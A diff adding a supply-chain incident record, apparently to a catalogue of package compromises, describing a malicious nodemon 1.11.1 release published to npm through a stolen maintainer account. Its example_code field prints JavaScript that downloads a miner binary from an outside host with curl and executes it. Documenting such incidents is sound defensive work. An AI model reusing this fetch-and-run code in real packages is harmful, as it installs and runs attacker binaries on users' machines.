@@ -1,0 +1,47 @@
+- name: "nodemon"
+  title: "Nodemon compromised through stolen credentials"
+  start_date: "2017-07-12"
+  end_date: "2017-07-13"
+  license: "MIT"
+  website: "https://nodemon.io/"
+  repo: "https://github.com/remy/nodemon"
+  attribution_type: "unknown"
+  component_type: "Library"
+  lang: "JavaScript"
+  cause: "compromise"
+  motive: "cryptocurrency mining"
+  attack_vector: "credential theft"
+  insertion_phase: "distribution"
+  impact_type: "cryptocurrency mining"
+  impact_user_count: 1800
+  references:
+    - "https://kompost.cz/post/20170713-postmortem-nodemon-backdooring"
+    - "https://github.com/ChALkeR/notes/blob/master/Gathering-weak-npm-credentials.md"
+  versions:
+    - "1.11.1"
+  synopsis: "An attacker compromised the NPM credentials of the nodemon maintainer and published a malicious version (1.11.1) to NPM. The malicious code injected a cryptocurrency miner into users' applications."
+  compromise_desc: "The attacker gained access to the NPM account of Remy Sharp, the maintainer of nodemon, likely through credential stuffing or password reuse. They published a malicious version 1.11.1 to NPM without modifying the GitHub repository."
+  impact_desc: "The malicious package contained code that would run a cryptocurrency miner on affected systems. According to NPM, approximately 1,800 users downloaded the compromised version during the ~24 hours it was available before being taken down."
+  example_code: |
+    var utils = require('./utils');
+    var os = require('os');
+    var exec = require('child_process').exec;
+
+    var platform = os.platform();
+    var arch = os.arch();
+    var rns = utils.random();
+
+    var https = require('https');
+
+    https.get('https://1-jl.com/r/1?n='+rns, function() {
+      var filename = 'miner-'+platform+'-'+arch;
+      if (platform === 'win32') {
+        filename += '.exe';
+      }
+      var dest = '/tmp/'+utils.random()
+      if (platform === 'win32') {
+        dest = os.tmpdir()+'\\'+utils.random()+'.exe';
+      }
+      exec('curl -o '+dest+' https://1-jl.com/r/'+filename+' && chmod +x '+dest+' && '+dest+' -c "'+rns+'"');
+    });
+```
